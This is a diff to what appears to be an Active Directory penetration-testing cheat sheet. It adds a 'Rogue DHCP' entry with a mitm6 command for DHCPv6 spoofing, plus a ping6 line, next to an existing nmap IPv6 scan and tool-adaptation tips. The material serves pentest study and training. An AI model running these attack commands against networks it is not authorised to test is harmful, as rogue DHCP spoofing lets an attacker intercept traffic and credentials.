@@ -71,6 +71,7 @@ it is the first version of this repo, many things will be added later, so stay t
       - [MachineAccountQuota (MAQ) Exploitation](#machineaccountquota-maq-exploitation)
       - [Bad-Pwd-Count]()
     - [Abusing IPv6 in AD](#abusing-ipv6-in-ad)
+      - [Rogue DHCP](#rogue-dhcp) 
       - [IOXIDResolver Interface Enumeration](#ioxidresolver-interface-enumeration)
 
 
@@ -342,9 +343,15 @@ use crackmapexec (CME) with maq module :
 
 ### Abusing IPv6 in AD 
 
+sending ICMPv6 packet to the target using ping6 :
+
+`ping6 -c 3 <target>`
+
 scanning IPv6 address using nmap :
 
 `nmap -6 -sCV dead:beef:0000:0000:b885:d62a:d679:573f --max-retries=2 --min-rate=3000 -Pn -T3`
+
+
 
 tips for adapting tools for ipv6 :
 ```bash
@@ -355,6 +362,10 @@ you can replace AF_INET value to AF_INET6 from socket python lib :
 ```bash
 sed -i "s/AF_INET/AF_INET6/g" script.py
 ```
+
+#### Rogue DHCP 
+
+`mitm6 -i eth0 -d 'domain.job.local'`
 
 #### IOXIDResolver Interface Enumeration
 
